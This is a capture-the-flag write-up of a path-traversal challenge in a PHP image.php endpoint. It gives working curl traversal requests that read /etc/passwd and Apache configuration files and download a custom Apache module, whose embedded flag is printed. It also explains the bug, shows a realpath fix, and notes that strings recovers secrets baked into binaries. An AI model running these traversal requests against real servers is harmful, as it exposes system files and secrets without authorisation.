# THCity: Authentication Collapse — 1

- **Category:** Web
- **Challenge ID:** 2
- **Target:** `http://web-thcity-authentication-collapse.ctf.thcon.party:8888`
- **CWE:** CWE-22 (Path Traversal)

```
THC{L34k_Ap4ch3_m0dul3_fR0m_F1l3_r3@d}
```

## TL;DR

- The page embeds an `<img src="/image.php?img=banner.jpg">`. `image.php` does `readfile("./images/" . $_GET["img"])` with no sanitization → **LFI by traversal**.
- `robots.txt` mentions `/secret/`, which is gated by HTTP Basic Auth via a custom `AuthBasicProvider thcity`. The provider is a non-stock Apache module: `mod_auth_thcity.so`.
- LFI Apache's `conf-enabled/thcon.conf` to confirm the module name, then `mods-enabled/auth_thcity.load` for the path. Pull the `.so` over the LFI.
- The flag is a hardcoded string constant baked into the module — `strings mod_auth_thcity.so | grep THC{` prints it.

## 1. Recon

```bash
$ curl -sI http://web-thcity-authentication-collapse.ctf.thcon.party:8888/
Server: Apache/2.4.57 (Debian)

$ curl -s .../robots.txt
User-agent: *
Disallow: /secret/
Disallow: /admin/

$ curl -sI .../secret/
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Basic realm="THCity Secret Area"

$ curl -s .../ | grep image.php
<img src="/image.php?img=banner.jpg" />
```

Three things matter:

| Surface | Signal |
|---|---|
| `/image.php?img=...` | file read with user-controlled path |
| `/secret/` | gated, custom `WWW-Authenticate` realm |
| Apache version | known config layout under `/etc/apache2/` |

## 2. Confirming the LFI

The intended path prefix is `./images/` — counting `..` levels: `./images/` → `..` → web root → `..` → `/var/www/` → `..` → `/var/` → `..` → `/`. Four `../` reach the filesystem root.

```bash
$ curl -s ".../image.php?img=../../../../etc/passwd" | head
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

LFI confirmed.

## 3. Walking from `secret/` → custom auth module → `.so`

The `WWW-Authenticate: Basic realm="THCity Secret Area"` is from a stock Basic-auth flow, but the realm name is custom — likely a custom Apache `AuthBasicProvider`. Check the conf:

```bash
$ curl -s ".../image.php?img=../../../../etc/apache2/conf-enabled/thcon.conf"
<Directory "/var/www/html/secret/">
    AuthType Basic
    AuthName "THCity Secret Area"
    AuthBasicProvider thcity            ← custom provider
    Require valid-user
</Directory>
```

The provider name (`thcity`) is implemented by a `mod_auth_thcity.so`. Apache loads it via a `*.load` file under `mods-enabled/`:

```bash
$ curl -s ".../image.php?img=../../../../etc/apache2/mods-enabled/auth_thcity.load"
LoadModule auth_thcity_module /usr/lib/apache2/modules/mod_auth_thcity.so
```

Pull the binary itself:

```bash
$ curl -s ".../image.php?img=../../../../usr/lib/apache2/modules/mod_auth_thcity.so" \
    -o mod_auth_thcity.so
$ file mod_auth_thcity.so
ELF 64-bit LSB shared object, x86-64, ...
```

## 4. Reading the flag out of the binary

Compiled string constants live in `.rodata`; `strings` finds them:

```bash
$ strings mod_auth_thcity.so | grep -i THC{
THC{L34k_Ap4ch3_m0dul3_fR0m_F1l3_r3@d}
```

One-liner equivalent:

```bash
curl -s ".../image.php?img=../../../../usr/lib/apache2/modules/mod_auth_thcity.so" \
  | strings | grep 'THC{'
```

## 5. Why the bug exists

Pseudo-source:

```php
<?php
$img = "./images/" . $_GET["img"];   // raw concat, no basename, no realpath
if (is_file($img)) { readfile($img); }
```

A safe equivalent:

```php
$base = realpath(__DIR__ . "/images");
$target = realpath($base . "/" . $_GET["img"]);
if ($target === false || strpos($target, $base) !== 0) { http_response_code(400); exit; }
readfile($target);
```

`realpath` plus a prefix check is the canonical containment.

## 6. Methodology

- **`<img src="image.php?...">` is the most LFI-prone single tag in PHP.** Whenever the source serves an asset through a script with a `path/file/img` parameter, traversal is the first thing to try.
- **Use `/etc/passwd` as the LFI canary; pivot to vendor-specific files when the bug is confirmed.** Apache config is reliably at `/etc/apache2/{apache2.conf, conf-enabled/, mods-enabled/, sites-enabled/}` on Debian.
- **Custom `AuthBasicProvider` names hint at custom modules.** A non-standard realm name is enough to start hunting for `mod_auth_*.so`. The `*.load` files are tiny and tell you the binary path.
- **Secrets compiled into binaries are not hidden.** `strings` on `.so`/`.dll`/`.exe` recovers any string constant. The mitigation is to read secrets from environment or sealed storage at runtime, not bake them into `.rodata`.
- **`strings` is content-blind:** the same trick works for finding API keys, JWT secrets, hardcoded passwords, etc. — not just CTF flags.
